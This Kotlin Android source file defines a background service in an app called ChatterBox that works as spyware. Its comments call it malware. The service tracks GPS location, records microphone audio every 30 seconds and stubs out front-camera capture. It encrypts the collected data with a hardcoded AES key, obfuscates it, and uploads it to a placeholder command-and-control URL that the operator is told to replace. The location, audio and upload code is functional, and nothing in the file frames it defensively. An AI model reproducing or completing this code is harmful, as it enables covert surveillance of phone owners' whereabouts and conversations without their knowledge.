package com.example.ChatterBox.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import java.io.File
import java.io.IOException
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.util.concurrent.TimeUnit

class DataCollectionService : Service() {
    
    private val TAG = "DataCollectionService"
    private val COLLECTION_INTERVAL = 30000L // 30 seconds
    private val C2_SERVER_URL = "https://example.com/upload" // Replace with your C2 server
    private val SECRET_KEY = "c7f31783b7184d1892a5a30b24d28929" // Encryption key
    
    private val handler = Handler(Looper.getMainLooper())
    private var locationManager: LocationManager? = null
    private var mediaRecorder: MediaRecorder? = null
    private lateinit var cameraExecutor: ExecutorService
    private var isRecording = false
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    
    // Runnable for periodic collection
    private val dataCollectionRunnable = object : Runnable {
        override fun run() {
            CoroutineScope(Dispatchers.IO).launch {
                collectData()
                handler.postDelayed(this@Runnable, COLLECTION_INTERVAL)
            }
        }
    }
    
    // Location listener
    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            // Store location data
            val locationData = "lat:${location.latitude},lon:${location.longitude}"
            saveData("location", locationData)
        }
        
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        cameraExecutor = Executors.newSingleThreadExecutor()
        
        // Start periodic collection
        handler.post(dataCollectionRunnable)
        
        // Start location updates
        startLocationUpdates()
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(dataCollectionRunnable)
        stopLocationUpdates()
        stopVoiceRecording()
        cameraExecutor.shutdown()
    }
    
    private fun startLocationUpdates() {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    COLLECTION_INTERVAL,
                    10f,
                    locationListener
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error starting location updates: ${e.message}")
        }
    }
    
    private fun stopLocationUpdates() {
        locationManager?.removeUpdates(locationListener)
    }
    
    private fun takePhoto() {
        val outputFile = File(externalCacheDir, "capture_${System.currentTimeMillis()}.jpg")
        
        try {
            if (ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.CAMERA
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = getFrontFacingCameraId(cameraManager)
                
                if (cameraId != null) {
                    // In a real implementation, we'd use the Camera2 API to take a photo
                    // This is simplified for demonstration purposes
                    Log.d(TAG, "Taking photo with camera ID: $cameraId")
                    saveData("photo", "photo_data_placeholder")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error taking photo: ${e.message}")
        }
    }
    
    private fun getFrontFacingCameraId(cameraManager: CameraManager): String? {
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return cameraId
                }
            }
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Error accessing camera: ${e.message}")
        }
        return null
    }
    
    private fun startVoiceRecording() {
        if (isRecording) return
        
        val audioFile = File(externalCacheDir, "audio_${System.currentTimeMillis()}.3gp")
        
        try {
            if (ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.RECORD_AUDIO
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                
                mediaRecorder?.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                    setOutputFile(audioFile.absolutePath)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                    prepare()
                    start()
                    isRecording = true
                    
                    // Record for 10 seconds
                    handler.postDelayed({
                        stopVoiceRecording()
                        saveData("audio", audioFile.absolutePath)
                    }, 10000)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error recording audio: ${e.message}")
            stopVoiceRecording()
        }
    }
    
    private fun stopVoiceRecording() {
        if (!isRecording) return
        
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
        } finally {
            mediaRecorder = null
            isRecording = false
        }
    }
    
    private suspend fun collectData() {
        try {
            // Take photo
            takePhoto()
            
            // Record audio
            startVoiceRecording()
            
            // Send data to C2 server
            sendDataToC2Server()
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting data: ${e.message}")
        }
    }
    
    private fun saveData(type: String, data: String) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val encryptedData = encrypt(data)
        
        val dataEntry = "$timestamp:$type:$encryptedData"
        
        // Save locally - in real malware this would be more stealthy
        val file = File(filesDir, "collected_data.txt")
        try {
            file.appendText("$dataEntry\n")
        } catch (e: IOException) {
            Log.e(TAG, "Error saving data: ${e.message}")
        }
    }
    
    private suspend fun sendDataToC2Server() {
        val dataFile = File(filesDir, "collected_data.txt")
        if (!dataFile.exists() || dataFile.length() == 0L) return
        
        try {
            withContext(Dispatchers.IO) {
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "data",
                        "data.txt",
                        RequestBody.create(
                            "text/plain".toMediaTypeOrNull(),
                            obfuscateData(dataFile.readText())
                        )
                    )
                    .build()
                
                val request = Request.Builder()
                    .url(C2_SERVER_URL)
                    .post(requestBody)
                    .build()
                
                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        // Clear the data file after successful upload
                        dataFile.writeText("")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending data to C2 server: ${e.message}")
        }
    }
    
    private fun encrypt(data: String): String {
        try {
            val md = MessageDigest.getInstance("SHA-256")
            val key = md.digest(SECRET_KEY.toByteArray()).copyOf(16) // AES requires 16, 24, or 32 bytes
            val secretKey = SecretKeySpec(key, "AES")
            
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.ENCRYPT_MODE, secretKey)
            
            val encryptedBytes = cipher.doFinal(data.toByteArray())
            return Base64.encodeToString(encryptedBytes, Base64.DEFAULT)
        } catch (e: Exception) {
            Log.e(TAG, "Encryption error: ${e.message}")
            return data // Fallback to unencrypted data
        }
    }
    
    private fun obfuscateData(data: String): String {
        // Simple obfuscation - in a real scenario, this would be more sophisticated
        val reversed = data.reversed()
        return Base64.encodeToString(reversed.toByteArray(), Base64.DEFAULT)
    }
}
